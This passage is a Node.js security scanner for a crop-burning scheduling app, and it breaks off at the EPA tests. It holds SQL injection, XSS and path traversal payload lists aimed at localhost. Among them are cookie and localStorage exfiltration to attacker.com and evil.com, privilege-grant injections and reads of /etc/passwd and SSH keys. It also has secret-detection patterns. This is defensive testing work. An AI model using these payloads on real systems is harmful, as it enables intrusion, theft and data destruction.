#!/usr/bin/env node

/**
 * BURNWISE SECURITY & EPA COMPLIANCE SCANNER
 * 
 * CRITICAL RULES:
 * 1. Tests ACTUAL vulnerabilities - not theoretical
 * 2. Verifies EPA calculations match official formulas  
 * 3. Reports vulnerabilities WITHOUT fixing them
 * 4. Creates test_security_${Date.now()} database for isolated testing
 */

const mysql = require('mysql2/promise');
const axios = require('axios');
const crypto = require('crypto');
const fs = require('fs');
const path = require('path');

class SecurityComplianceScanner {
  constructor() {
    this.testDatabase = `test_security_${Date.now()}`;
    this.testResults = {
      agent: "Security and Compliance Scanner",
      testsRun: 0,
      passed: 0,
      failed: 0,
      vulnerabilities: {
        critical: [],
        high: [],
        medium: [],
        low: []
      },
      exposedSecrets: [],
      epaCompliance: {
        pm25Accurate: false,
        thresholdsEnforced: false,
        formulasCorrect: false,
        deviationFromEPA: 0
      },
      criticalFailures: []
    };
    
    // EPA-compliant PM2.5 thresholds (µg/m³)
    this.epaStandards = {
      dailyLimit: 35,        // 24-hour average (primary standard)
      annualLimit: 12,       // Annual arithmetic mean (primary standard)
      unhealthySensitive: 35.5, // AQI "Orange" threshold
      unhealthy: 55.5,       // AQI "Red" threshold  
      veryUnhealthy: 150.5,  // AQI "Purple" threshold
      hazardous: 250.5       // AQI "Maroon" threshold
    };
  }

  async runComprehensiveTests() {
    console.log('🔍 BURNWISE SECURITY & EPA COMPLIANCE SCANNER');
    console.log('=' .repeat(80));
    console.log(`Test Environment: ${this.testDatabase}`);
    console.log('⚠️  TESTING FOR ACTUAL VULNERABILITIES - NOT FIXING THEM\n');

    try {
      await this.setupTestEnvironment();
      
      // 1. SQL Injection Tests (100+ payloads)
      await this.testSQLInjection();
      
      // 2. XSS Tests
      await this.testXSSVulnerabilities();
      
      // 3. Authentication/Authorization Tests
      await this.testAuthVulnerabilities();
      
      // 4. Path Traversal Tests
      await this.testPathTraversal();
      
      // 5. Sensitive Data Exposure Tests
      await this.testSensitiveDataExposure();
      
      // 6. Rate Limiting Bypass Tests
      await this.testRateLimitingBypass();
      
      // 7. CORS Policy Tests
      await this.testCORSPolicy();
      
      // 8. EPA Compliance Tests
      await this.testEPACompliance();
      
      // 9. Gaussian Plume Model Accuracy Tests
      await this.testGaussianPlumeAccuracy();
      
      // 10. Regulatory Threshold Tests
      await this.testRegulatoryThresholds();
      
      await this.cleanupTestEnvironment();
      
      return this.generateFinalReport();
      
    } catch (error) {
      console.error('Scanner failed:', error.message);
      this.testResults.criticalFailures.push({
        error: error.message,
        stack: error.stack
      });
      return this.generateFinalReport();
    }
  }

  async setupTestEnvironment() {
    console.log('📋 Setting up isolated test environment...');
    
    try {
      // Create isolated test database connection
      this.connection = await mysql.createConnection({
        host: process.env.TIDB_HOST,
        port: parseInt(process.env.TIDB_PORT) || 4000,
        user: process.env.TIDB_USER,
        password: process.env.TIDB_PASSWORD,
        ssl: {
          rejectUnauthorized: true,
          minVersion: 'TLSv1.2'
        }
      });

      // Create test database
      await this.connection.execute(`CREATE DATABASE IF NOT EXISTS ${this.testDatabase}`);
      await this.connection.execute(`USE ${this.testDatabase}`);
      
      console.log(`✅ Test database '${this.testDatabase}' created`);
      
    } catch (error) {
      throw new Error(`Test environment setup failed: ${error.message}`);
    }
  }

  async testSQLInjection() {
    console.log('\n🚨 1. SQL INJECTION VULNERABILITY TESTS');
    console.log('-'.repeat(50));
    
    const sqlPayloads = [
      // Classic SQL Injection
      "' OR '1'='1",
      "'; DROP TABLE farms; --",
      "' UNION SELECT * FROM information_schema.tables --",
      "admin'--",
      "admin'/*",
      "' OR 1=1#",
      "' OR 'a'='a",
      "' OR ''='",
      "1' OR '1'='1",
      
      // Union-based SQL Injection
      "' UNION SELECT username, password FROM users --",
      "' UNION SELECT table_name, column_name FROM information_schema.columns --",
      "' UNION SELECT @@version --",
      "' UNION SELECT database() --",
      "' UNION SELECT user() --",
      "' UNION ALL SELECT NULL,NULL,NULL --",
      
      // Boolean-based Blind SQL Injection  
      "' AND (SELECT COUNT(*) FROM users) > 0 --",
      "' AND (SELECT SUBSTRING(username,1,1) FROM users WHERE id=1)='a' --",
      "' AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))=97 --",
      
      // Time-based Blind SQL Injection
      "'; WAITFOR DELAY '00:00:05' --",
      "' AND (SELECT SLEEP(5)) --",
      "'; SELECT pg_sleep(5) --",
      "' OR IF(1=1, SLEEP(5), 0) --",
      
      // Error-based SQL Injection
      "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(@@version,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a) --",
      "' AND extractvalue(rand(),concat(0x7e,@@version,0x7e)) --",
      "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT((SELECT password FROM users LIMIT 1),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a) --",
      
      // Second-order SQL Injection
      "admin'; INSERT INTO users VALUES ('hacker', 'pass'); --",
      "'; UPDATE users SET password='hacked' WHERE username='admin'; --",
      
      // NoSQL Injection (for potential MongoDB usage)
      "'; return true; //",
      "'; return this.username == 'admin'; //",
      "$ne",
      "[$regex]",
      
      // Advanced SQL Injection techniques
      "' OR (SELECT COUNT(*) FROM DUAL) --",
      "' AND (SELECT * FROM (SELECT(SLEEP(5)))a) --",
      "' PROCEDURE ANALYSE(EXTRACTVALUE(RAND(),CONCAT(0x7e,VERSION())),1) --",
      "' AND ROW(1,1) > (SELECT COUNT(*),CONCAT(CHAR(95),CHAR(33),@@version,CHAR(95),CHAR(33),FLOOR(RAND(0)*2)) FROM information_schema.tables GROUP BY 2) --",
      
      // Context-specific payloads for agricultural data
      "'; INSERT INTO burn_requests (farm_id, status) VALUES ('malicious', 'approved'); --",
      "' UNION SELECT farm_name, owner_phone FROM farms WHERE owner_phone LIKE '%' --",
      "'; DELETE FROM weather_data WHERE 1=1; --",
      
      // Vector injection attempts
      "'; UPDATE weather_data SET weather_pattern_embedding = '[malicious_vector]' WHERE 1=1; --",
      
      // Spatial query injection
      "'; SELECT ST_AsText(location) FROM farms; --",
      
      // Date/time injection
      "2025-01-01'; DELETE FROM schedules; --",
      
      // Numeric injection
      "1 OR 1=1",
      "1; DROP TABLE burn_requests; --",
      
      // Filter bypass attempts
      "' OR 'x' LIKE 'x",
      "' OR 'x' REGEXP 'x",
      "' OR POSITION('a' IN 'abc') --",
      
      // Encoding bypasses
      "' %4f%52 '1'='1",  // URL encoded OR
      "' &#111;&#114; '1'='1",  // HTML entity encoded
      "' 0x4f0x52 '1'='1",  // Hex encoded
      
      // Concatenation bypasses
      "' || 'a'='a",
      "' + 'a'='a",
      "' & 'a'='a",
      
      // Function-based injection
      "' OR CHAR(65)=CHAR(65) --",
      "' OR ASCII('A')=65 --",
      
      // Subquery injection
      "' OR (SELECT 'a' FROM DUAL WHERE '1'='1') --",
      
      // Case variation bypasses
      "' oR '1'='1",
      "' Or '1'='1",
      "' OR '1'='1",
      
      // Comment variation bypasses  
      "' OR '1'='1' /*",
      "' OR '1'='1' #",
      "' OR '1'='1' --+",
      
      // Whitespace bypasses
      "'/**/OR/**/'1'='1",
      "'%0aOR%0a'1'='1",
      "'%09OR%09'1'='1",
      
      // Quote bypasses
      'admin"--',
      '\\" OR \\"1\\"=\\"1',
      "\\' OR \\'1\\'=\\'1",
      
      // Stacked queries
      "'; EXEC xp_cmdshell('whoami'); --",
      "'; SELECT * FROM users; SELECT * FROM farms; --",
      
      // Out-of-band techniques
      "' UNION SELECT LOAD_FILE(CONCAT('\\\\\\\\',(SELECT @@version),'.attacker.com\\\\test')) --",
      
      // Double encoding
      "' %252f%252a OR %252a%252f '1'='1",
      
      // Length-based blind
      "' AND LENGTH((SELECT password FROM users LIMIT 1))=32 --",
      
      // Substring extraction
      "' AND SUBSTRING((SELECT password FROM users LIMIT 1),1,1)='a' --",
      
      // Database fingerprinting
      "' AND @@version LIKE '%MySQL%' --",
      "' AND database() LIKE '%burnwise%' --",
      
      // Privilege escalation attempts
      "'; GRANT ALL PRIVILEGES ON *.* TO 'hacker'@'%'; --",
      "'; CREATE USER 'backdoor'@'%' IDENTIFIED BY 'pass'; --",
      
      // File system access attempts
      "' UNION SELECT LOAD_FILE('/etc/passwd') --",
      "' INTO OUTFILE '/tmp/hacked.txt' --",
      
      // Schema discovery
      "' UNION SELECT table_name FROM information_schema.tables WHERE table_schema=database() --",
      "' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users' --"
    ];
    
    let vulnerableEndpoints = [];
    
    // Test each payload against critical endpoints
    const testEndpoints = [
      '/api/burn-requests',
      '/api/farms', 
      '/api/weather/current',
      '/api/schedule',
      '/api/analytics'
    ];
    
    for (const endpoint of testEndpoints) {
      console.log(`  Testing ${endpoint}...`);
      
      for (const payload of sqlPayloads) {
        this.testResults.testsRun++;
        
        try {
          // Test as query parameter
          const queryTest = await this.testEndpointWithPayload(endpoint, 'query', payload);
          if (queryTest.vulnerable) {
            vulnerableEndpoints.push({
              endpoint,
              payload,
              method: 'GET',
              parameter: 'query',
              evidence: queryTest.evidence
            });
            this.testResults.failed++;
          } else {
            this.testResults.passed++;
          }
          
          // Test as POST body
          const bodyTest = await this.testEndpointWithPayload(endpoint, 'body', payload);
          if (bodyTest.vulnerable) {
            vulnerableEndpoints.push({
              endpoint,
              payload,
              method: 'POST', 
              parameter: 'body',
              evidence: bodyTest.evidence
            });
            this.testResults.failed++;
          } else {
            this.testResults.passed++;
          }
          
        } catch (error) {
          // Network errors don't count as test failures
          console.warn(`    Network error testing ${payload}: ${error.message}`);
        }
      }
    }
    
    // Categorize SQL injection vulnerabilities
    vulnerableEndpoints.forEach(vuln => {
      if (vuln.payload.includes('DROP TABLE') || vuln.payload.includes('DELETE FROM')) {
        this.testResults.vulnerabilities.critical.push({
          type: 'SQL Injection - Data Destruction',
          endpoint: vuln.endpoint,
          payload: vuln.payload,
          risk: 'Complete data loss possible',
          evidence: vuln.evidence
        });
      } else if (vuln.payload.includes('UNION SELECT') || vuln.payload.includes('information_schema')) {
        this.testResults.vulnerabilities.high.push({
          type: 'SQL Injection - Data Extraction',
          endpoint: vuln.endpoint,
          payload: vuln.payload,
          risk: 'Sensitive data exposure',
          evidence: vuln.evidence
        });
      } else {
        this.testResults.vulnerabilities.medium.push({
          type: 'SQL Injection - General',
          endpoint: vuln.endpoint,
          payload: vuln.payload,
          risk: 'Database manipulation possible',
          evidence: vuln.evidence
        });
      }
    });
    
    console.log(`  ✅ SQL Injection tests completed: ${vulnerableEndpoints.length} vulnerabilities found`);
  }

  async testEndpointWithPayload(endpoint, type, payload) {
    try {
      const baseUrl = 'http://localhost:5001';
      
      if (type === 'query') {
        const response = await axios.get(`${baseUrl}${endpoint}?farm_id=${encodeURIComponent(payload)}`, {
          timeout: 5000,
          validateStatus: () => true // Don't throw on error status codes
        });
        
        return this.analyzeResponse(response, payload);
        
      } else if (type === 'body') {
        const response = await axios.post(`${baseUrl}${endpoint}`, {
          farm_id: payload,
          burn_date: '2025-08-10',
          acres: 100,
          crop_type: 'wheat'
        }, {
          timeout: 5000,
          validateStatus: () => true
        });
        
        return this.analyzeResponse(response, payload);
      }
      
    } catch (error) {
      if (error.code === 'ECONNREFUSED') {
        throw new Error('Backend server not running - start with npm run backend:dev');
      }
      return { vulnerable: false, evidence: null };
    }
  }

  analyzeResponse(response, payload) {
    const suspiciousPatterns = [
      /mysql/i,
      /sql error/i,
      /syntax error/i,
      /table.*doesn.*exist/i,
      /unknown column/i,
      /duplicate entry/i,
      /access denied/i,
      /you have an error in your sql syntax/i,
      /warning: mysql/i,
      /fatal error/i,
      /call to undefined function/i,
      /@version/i,
      /information_schema/i,
      /database\(\)/i,
      /user\(\)/i
    ];
    
    const responseText = JSON.stringify(response.data) + response.headers['content-type'] || '';
    
    // Check for SQL error patterns in response
    for (const pattern of suspiciousPatterns) {
      if (pattern.test(responseText)) {
        return {
          vulnerable: true,
          evidence: `SQL error pattern detected: ${pattern.toString()}`
        };
      }
    }
    
    // Check for unusual response times (potential blind SQL injection)
    if (payload.includes('SLEEP') || payload.includes('WAITFOR')) {
      // This would require timing analysis in real implementation
      return { vulnerable: false, evidence: null };
    }
    
    // Check for successful bypass indicators
    if (response.status === 200 && payload.includes("' OR '1'='1")) {
      const dataReturned = response.data?.data?.length || 0;
      if (dataReturned > 0) {
        return {
          vulnerable: true,
          evidence: `Authentication bypass successful - returned ${dataReturned} records`
        };
      }
    }
    
    return { vulnerable: false, evidence: null };
  }

  async testXSSVulnerabilities() {
    console.log('\n🚨 2. XSS VULNERABILITY TESTS');
    console.log('-'.repeat(50));
    
    const xssPayloads = [
      '<script>alert("XSS")</script>',
      '<img src=x onerror=alert("XSS")>',
      '<svg onload=alert("XSS")>',
      'javascript:alert("XSS")',
      '"><script>alert("XSS")</script>',
      "'><script>alert('XSS')</script>",
      '<iframe src=javascript:alert("XSS")></iframe>',
      '<body onload=alert("XSS")>',
      '<input type="image" src=x onerror=alert("XSS")>',
      '<object data="javascript:alert(\'XSS\')">',
      '<embed src="javascript:alert(\'XSS\')">',
      '<link rel=stylesheet href="javascript:alert(\'XSS\')">',
      '<style>@import"javascript:alert(\'XSS\')";</style>',
      '<meta http-equiv="refresh" content="0;url=javascript:alert(\'XSS\')">',
      '<form action="javascript:alert(\'XSS\')"><input type=submit>',
      '<button onclick="alert(\'XSS\')">Click</button>',
      '<div onmouseover="alert(\'XSS\')">Hover</div>',
      '{{constructor.constructor("alert(\'XSS\')")()}}', // Template injection
      '${alert("XSS")}', // Template literal injection
      '<script>fetch("//attacker.com?data="+document.cookie)</script>', // Data exfiltration
      
      // Encoded XSS
      '&lt;script&gt;alert("XSS")&lt;/script&gt;',
      '&#60;script&#62;alert("XSS")&#60;/script&#62;',
      '%3Cscript%3Ealert("XSS")%3C/script%3E',
      
      // Context-specific XSS for agricultural app
      '<script>alert("Farm: " + document.location)</script>',
      '"><img src=x onerror=fetch("//evil.com?burn_data="+JSON.stringify(localStorage))>',
      
      // DOM-based XSS
      'javascript:void(0)/*-*/,alert("XSS")/**/;',
      '"><svg/onload=eval(atob("YWxlcnQoIlhTUyIp"))>', // Base64 encoded alert
      
      // Event handler XSS
      '" onmouseover="alert(\'XSS\')" style="',
      '" onfocus="alert(\'XSS\')" autofocus="',
      '" onblur="alert(\'XSS\')" autofocus onblur="',
      
      // CSS injection
      'expression(alert("XSS"))',
      'url("javascript:alert(\'XSS\')")',
      
      // Filter bypasses
      '<scr<script>ipt>alert("XSS")</scr</script>ipt>',
      '<SCRipt>alert("XSS")</SCRipt>',
      '<script\x20type="text/javascript">alert("XSS");</script>',
      '<script\x3Etype="text/javascript">alert("XSS");</script>',
      '<script\x0Dtype="text/javascript">alert("XSS");</script>',
      '<script\x09type="text/javascript">alert("XSS");</script>',
      '<script\x0Ctype="text/javascript">alert("XSS");</script>',
      '<script\x2Ftype="text/javascript">alert("XSS");</script>',
      '<script\x0Atype="text/javascript">alert("XSS");</script>',
      
      // Unicode bypasses
      '\\u003cscript\\u003ealert("XSS")\\u003c/script\\u003e',
      '\\x3cscript\\x3ealert("XSS")\\x3c/script\\x3e'
    ];
    
    let xssVulnerabilities = [];
    
    for (const payload of xssPayloads) {
      this.testResults.testsRun++;
      
      try {
        // Test XSS in farm name
        const response = await axios.post('http://localhost:5001/api/burn-requests', {
          farm_id: 'farm_123',
          field_name: payload,
          burn_date: '2025-08-10',
          acres: 100,
          crop_type: 'wheat',
          notes: payload
        }, {
          timeout: 5000,
          validateStatus: () => true
        });
        
        const responseText = JSON.stringify(response.data);
        
        // Check if payload is reflected unescaped
        if (responseText.includes(payload) && !responseText.includes('&lt;') && !responseText.includes('&amp;')) {
          xssVulnerabilities.push({
            type: 'Reflected XSS',
            payload,
            endpoint: '/api/burn-requests',
            field: 'field_name/notes',
            evidence: 'Payload reflected without encoding'
          });
          this.testResults.failed++;
        } else {
          this.testResults.passed++;
        }
        
      } catch (error) {
        console.warn(`XSS test failed: ${error.message}`);
      }
    }
    
    // Categorize XSS vulnerabilities
    xssVulnerabilities.forEach(vuln => {
      if (vuln.payload.includes('document.cookie') || vuln.payload.includes('localStorage')) {
        this.testResults.vulnerabilities.critical.push({
          type: 'XSS - Data Exfiltration',
          ...vuln,
          risk: 'Session hijacking and data theft possible'
        });
      } else {
        this.testResults.vulnerabilities.high.push({
          type: 'XSS - Code Execution',
          ...vuln,
          risk: 'Arbitrary JavaScript execution in user browser'
        });
      }
    });
    
    console.log(`  ✅ XSS tests completed: ${xssVulnerabilities.length} vulnerabilities found`);
  }

  async testAuthVulnerabilities() {
    console.log('\n🚨 3. AUTHENTICATION/AUTHORIZATION TESTS');
    console.log('-'.repeat(50));
    
    let authVulns = [];
    
    // Test access without authentication
    this.testResults.testsRun++;
    try {
      const response = await axios.delete('http://localhost:5001/api/burn-requests/123', {
        timeout: 5000,
        validateStatus: () => true
      });
      
      if (response.status !== 401 && response.status !== 403) {
        authVulns.push({
          type: 'Missing Authentication',
          endpoint: '/api/burn-requests/123',
          method: 'DELETE',
          evidence: `Expected 401/403, got ${response.status}`,
          risk: 'Unauthorized access to protected resources'
        });
        this.testResults.failed++;
      } else {
        this.testResults.passed++;
      }
    } catch (error) {
      console.warn(`Auth test failed: ${error.message}`);
    }
    
    // Test JWT token manipulation
    this.testResults.testsRun++;
    const tamperedTokens = [
      'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.tampered.signature',
      'Bearer invalid-token-format',
      'Bearer ',
      'Bearer null',
      'Bearer undefined',
      'fake.jwt.token',
      ''
    ];
    
    for (const token of tamperedTokens) {
      try {
        const response = await axios.get('http://localhost:5001/api/burn-requests', {
          headers: {
            'Authorization': token
          },
          timeout: 5000,
          validateStatus: () => true
        });
        
        if (response.status === 200) {
          authVulns.push({
            type: 'JWT Token Bypass',
            token,
            evidence: 'Invalid token accepted',
            risk: 'Authentication bypass possible'
          });
          this.testResults.failed++;
        } else {
          this.testResults.passed++;
        }
      } catch (error) {
        // Expected for invalid tokens
        this.testResults.passed++;
      }
    }
    
    // Test privilege escalation
    this.testResults.testsRun++;
    try {
      const response = await axios.get('http://localhost:5001/api/farms/999999', {
        headers: {
          'Authorization': 'Bearer user-level-token'
        },
        timeout: 5000,
        validateStatus: () => true
      });
      
      if (response.status === 200) {
        authVulns.push({
          type: 'Horizontal Privilege Escalation',
          endpoint: '/api/farms/999999',
          evidence: 'User can access other farms data',
          risk: 'Unauthorized data access across farm boundaries'
        });
        this.testResults.failed++;
      } else {
        this.testResults.passed++;
      }
    } catch (error) {
      console.warn(`Privilege escalation test failed: ${error.message}`);
    }
    
    // Categorize auth vulnerabilities
    authVulns.forEach(vuln => {
      if (vuln.type.includes('Bypass') || vuln.type.includes('Missing')) {
        this.testResults.vulnerabilities.critical.push({
          type: `Authentication - ${vuln.type}`,
          ...vuln
        });
      } else {
        this.testResults.vulnerabilities.high.push({
          type: `Authorization - ${vuln.type}`,
          ...vuln
        });
      }
    });
    
    console.log(`  ✅ Auth tests completed: ${authVulns.length} vulnerabilities found`);
  }

  async testPathTraversal() {
    console.log('\n🚨 4. PATH TRAVERSAL TESTS');
    console.log('-'.repeat(50));
    
    const pathTraversalPayloads = [
      '../../../etc/passwd',
      '..\\..\\..\\windows\\system32\\config\\sam',
      '....//....//....//etc//passwd',
      '..%2f..%2f..%2fetc%2fpasswd',
      '..%252f..%252f..%252fetc%252fpasswd',
      '..%c0%af..%c0%af..%c0%afetc%c0%afpasswd',
      '/etc/passwd%00.jpg',
      '../../../proc/self/environ',
      '../../../home/user/.ssh/id_rsa',
      'file:///etc/passwd',
      '../../../var/log/mysql/mysql.log',
      '../../../tmp/burnwise.log'
    ];
    
    let pathTraversalVulns = [];
    
    for (const payload of pathTraversalPayloads) {
      this.testResults.testsRun++;
      
      try {
        // Test file access endpoints
        const response = await axios.get(`http://localhost:5001/api/farms/export?filename=${encodeURIComponent(payload)}`, {
          timeout: 5000,
          validateStatus: () => true
        });
        
        const responseText = JSON.stringify(response.data);
        
        // Check for successful file access indicators
        if (responseText.includes('root:x:') || 
            responseText.includes('Administrator') ||
            responseText.includes('/bin/bash') ||
            responseText.includes('mysql') ||
            responseText.includes('BEGIN RSA PRIVATE KEY')) {
          pathTraversalVulns.push({
            type: 'Path Traversal',
            payload,
            endpoint: '/api/farms/export',
            evidence: 'System file content detected in response',
            risk: 'Sensitive system file access'
          });
          this.testResults.failed++;
        } else {
          this.testResults.passed++;
        }
        
      } catch (error) {
        this.testResults.passed++; // Expected for blocked traversals
      }
    }
    
    // Categorize path traversal vulnerabilities
    pathTraversalVulns.forEach(vuln => {
      this.testResults.vulnerabilities.high.push({
        type: 'Path Traversal - File Access',
        ...vuln
      });
    });
    
    console.log(`  ✅ Path traversal tests completed: ${pathTraversalVulns.length} vulnerabilities found`);
  }

  async testSensitiveDataExposure() {
    console.log('\n🚨 5. SENSITIVE DATA EXPOSURE TESTS');
    console.log('-'.repeat(50));
    
    let exposedSecrets = [];
    
    // Check source code for hardcoded secrets
    const codebasePath = path.join(__dirname, '..');
    const sensitivePatterns = [
      /[A-Za-z0-9]{20,}/g, // Potential API keys
      /sk_[a-zA-Z0-9]{24,}/g, // Stripe secret keys
      /pk_[a-zA-Z0-9]{24,}/g, // Stripe publishable keys  
      /AIza[0-9A-Za-z\\-_]{35}/g, // Google API keys
      /AKIA[0-9A-Z]{16}/g, // AWS access keys
      /[0-9a-fA-F]{32}/g, // 32-char hex strings (potential tokens)
      /[0-9a-fA-F]{40}/g, // 40-char hex strings (potential SHA1)
      /password\s*[:=]\s*['"]\w+['"]/gi,
      /secret\s*[:=]\s*['"]\w+['"]/gi,
      /token\s*[:=]\s*['"]\w+['"]/gi,
      /api_key\s*[:=]\s*['"]\w+['"]/gi
    ];
    
    try {
      const files = this.findJSFiles(codebasePath);
      
      for (const file of files) {
        this.testResults.testsRun++;
        
        if (file.includes('node_modules') || file.includes('.git')) {
          this.testResults.passed++;
          continue;
        }
        
        try {
          const content = fs.readFileSync(file, 'utf8');
          
          for (const pattern of sensitivePatterns) {
            const matches = content.match(pattern);
            if (matches) {
              matches.forEach(match => {
                // Filter out obvious false positives
                if (!this.isFalsePositive(match)) {
                  exposedSecrets.push({
                    file: file.replace(codebasePath, ''),
                    pattern: pattern.toString(),
                    match: match.substring(0, 20) + '...',
                    risk: 'Hardcoded secret in source code'
                  });
                  this.testResults.failed++;
                } else {
                  this.testResults.passed++;
                }
              });
            }
          }
        } catch (error) {
          console.warn(`Failed to read ${file}: ${error.message}`);
          this.testResults.passed++;
        }
      }
    } catch (error) {
      console.warn(`Secret scanning failed: ${error.message}`);
    }
    
    // Test API responses for sensitive data leakage
    this.testResults.testsRun++;
    try {
      const response = await axios.get('http://localhost:5001/api/farms', {
        timeout: 5000,
        validateStatus: () => true
      });
      
      const responseText = JSON.stringify(response.data);
      
      // Check for common sensitive data patterns
      const sensitiveInResponse = [
        /password/i,
        /secret/i,
        /private.*key/i,
        /api.*key/i,
        /token/i,
        /\d{3}-\d{2}-\d{4}/g, // SSN pattern
        /\d{16}/g, // Credit card pattern
        /\+1\d{10}/g // Phone number pattern
      ];
      
      sensitiveInResponse.forEach(pattern => {
        if (pattern.test(responseText)) {
          exposedSecrets.push({
            type: 'API Response Data Leak',
            endpoint: '/api/farms',
            pattern: pattern.toString(),
            evidence: 'Sensitive data pattern found in API response',
            risk: 'Personal/sensitive information exposure'
          });
          this.testResults.failed++;
        }
      });
      
      if (exposedSecrets.length === 0) {
        this.testResults.passed++;
      }
      
    } catch (error) {
      console.warn(`API response test failed: ${error.message}`);
      this.testResults.passed++;
    }
    
    this.testResults.exposedSecrets = exposedSecrets;
    
    // Categorize by severity
    exposedSecrets.forEach(secret => {
      if (secret.file && (secret.match.includes('sk_') || secret.match.includes('AKIA'))) {
        this.testResults.vulnerabilities.critical.push({
          type: 'Hardcoded Critical Secret',
          ...secret
        });
      } else {
        this.testResults.vulnerabilities.high.push({
          type: 'Sensitive Data Exposure',
          ...secret
        });
      }
    });
    
    console.log(`  ✅ Sensitive data tests completed: ${exposedSecrets.length} exposures found`);
  }

  findJSFiles(dir) {
    let results = [];
    try {
      const files = fs.readdirSync(dir);
      
      for (const file of files) {
        const fullPath = path.join(dir, file);
        const stat = fs.statSync(fullPath);
        
        if (stat.isDirectory() && !file.startsWith('.') && file !== 'node_modules') {
          results = results.concat(this.findJSFiles(fullPath));
        } else if (file.endsWith('.js') || file.endsWith('.json') || file.endsWith('.env')) {
          results.push(fullPath);
        }
      }
    } catch (error) {
      // Directory access error
    }
    
    return results;
  }

  isFalsePositive(match) {
    const falsePositives = [
      'function',
      'console',
      'module',
      'require',
      'exports',
      'toString',
      'valueOf',
      'hasOwnProperty',
      'isPrototypeOf',
      'propertyIsEnumerable',
      '0123456789abcdef',
      'abcdefghijklmnop',
      'test_api_key',
      'mock_api_key',
      'example_secret',
      'your_token_here'
    ];
    
    return falsePositives.some(fp => match.toLowerCase().includes(fp));
  }

  async testRateLimitingBypass() {
    console.log('\n🚨 6. RATE LIMITING BYPASS TESTS');
    console.log('-'.repeat(50));
    
    let rateLimitVulns = [];
    
    // Test basic rate limiting
    this.testResults.testsRun++;
    const requests = [];
    for (let i = 0; i < 150; i++) { // Should exceed typical limits
      requests.push(
        axios.get('http://localhost:5001/api/burn-requests', {
          timeout: 2000,
          validateStatus: () => true
        }).catch(() => ({ status: 429 })) // Treat timeout as rate limited
      );
    }
    
    try {
      const responses = await Promise.all(requests);
      const rateLimitedCount = responses.filter(r => r.status === 429).length;
      
      if (rateLimitedCount < 10) {
        rateLimitVulns.push({
          type: 'Weak Rate Limiting',
          endpoint: '/api/burn-requests',
          evidence: `Only ${rateLimitedCount} out of 150 requests were rate limited`,
          risk: 'DoS attacks and resource exhaustion possible'
        });
        this.testResults.failed++;
      } else {
        this.testResults.passed++;
      }
    } catch (error) {
      console.warn(`Rate limiting test failed: ${error.message}`);
      this.testResults.passed++;
    }
    
    // Test bypass techniques
    const bypassTechniques = [
      { name: 'Different User-Agent', headers: { 'User-Agent': 'Mozilla/5.0 (bypass)' }},
      { name: 'X-Forwarded-For', headers: { 'X-Forwarded-For': '1.2.3.4' }},
      { name: 'X-Real-IP', headers: { 'X-Real-IP': '5.6.7.8' }},
      { name: 'X-Originating-IP', headers: { 'X-Originating-IP': '9.10.11.12' }},
      { name: 'X-Remote-IP', headers: { 'X-Remote-IP': '13.14.15.16' }},
      { name: 'X-Client-IP', headers: { 'X-Client-IP': '17.18.19.20' }},
    ];
    
    for (const technique of bypassTechniques) {
      this.testResults.testsRun++;
      
      try {
        const bypassRequests = [];
        for (let i = 0; i < 20; i++) {
          bypassRequests.push(
            axios.get('http://localhost:5001/api/burn-requests', {
              headers: technique.headers,
              timeout: 2000,
              validateStatus: () => true
            }).catch(() => ({ status: 429 }))
          );
        }
        
        const responses = await Promise.all(bypassRequests);
        const successfulRequests = responses.filter(r => r.status === 200).length;
        
        if (successfulRequests > 15) {
          rateLimitVulns.push({
            type: 'Rate Limit Bypass',
            technique: technique.name,
            evidence: `${successfulRequests} out of 20 requests succeeded with bypass technique`,
            risk: 'Rate limiting can be circumvented'
          });
          this.testResults.failed++;
        } else {
          this.testResults.passed++;
        }
        
      } catch (error) {
        this.testResults.passed++;
      }
    }
    
    // Categorize rate limiting vulnerabilities
    rateLimitVulns.forEach(vuln => {
      this.testResults.vulnerabilities.medium.push({
        type: `Rate Limiting - ${vuln.type}`,
        ...vuln
      });
    });
    
    console.log(`  ✅ Rate limiting tests completed: ${rateLimitVulns.length} vulnerabilities found`);
  }

  async testCORSPolicy() {
    console.log('\n🚨 7. CORS POLICY TESTS');
    console.log('-'.repeat(50));
    
    let corsVulns = [];
    
    // Test CORS with malicious origins
    const maliciousOrigins = [
      'https://evil.com',
      'http://localhost:3001', // Potentially malicious localhost
      'https://burnwise.evil.com',
      'null',
      '*'
    ];
    
    for (const origin of maliciousOrigins) {
      this.testResults.testsRun++;
      
      try {
        const response = await axios.options('http://localhost:5001/api/burn-requests', {
          headers: {
            'Origin': origin,
            'Access-Control-Request-Method': 'POST',
            'Access-Control-Request-Headers': 'Content-Type'
          },
          timeout: 5000,
          validateStatus: () => true
        });
        
        const allowedOrigin = response.headers['access-control-allow-origin'];
        
        if (allowedOrigin === origin || allowedOrigin === '*') {
          corsVulns.push({
            type: 'Permissive CORS Policy',
            origin,
            allowedOrigin,
            evidence: `Malicious origin ${origin} is allowed`,
            risk: 'Cross-origin attacks from malicious domains possible'
          });
          this.testResults.failed++;
        } else {
          this.testResults.passed++;
        }
        
      } catch (error) {
        this.testResults.passed++;
      }
    }
    
    // Test credential inclusion
    this.testResults.testsRun++;
    try {
      const response = await axios.get('http://localhost:5001/api/burn-requests', {
        headers: {
          'Origin': 'https://evil.com'
        },
        withCredentials: true,
        timeout: 5000,
        validateStatus: () => true
      });
      
      if (response.headers['access-control-allow-credentials'] === 'true') {
        corsVulns.push({
          type: 'CORS Credentials Allowed',
          evidence: 'Access-Control-Allow-Credentials: true with permissive origin',
          risk: 'Session hijacking via CORS'
        });
        this.testResults.failed++;
      } else {
        this.testResults.passed++;
      }
      
    } catch (error) {
      this.testResults.passed++;
    }
    
    // Categorize CORS vulnerabilities
    corsVulns.forEach(vuln => {
      if (vuln.type.includes('Credentials')) {
        this.testResults.vulnerabilities.high.push({
          type: `CORS - ${vuln.type}`,
          ...vuln
        });
      } else {
        this.testResults.vulnerabilities.medium.push({
          type: `CORS - ${vuln.type}`,
          ...vuln
        });
      }
    });
    
    console.log(`  ✅ CORS tests completed: ${corsVulns.length} vulnerabilities found`);
  }

  async testEPACompliance() {
    console.log('\n🏛️ 8. EPA COMPLIANCE TESTS');
    console.log('-'.repeat(50));
    
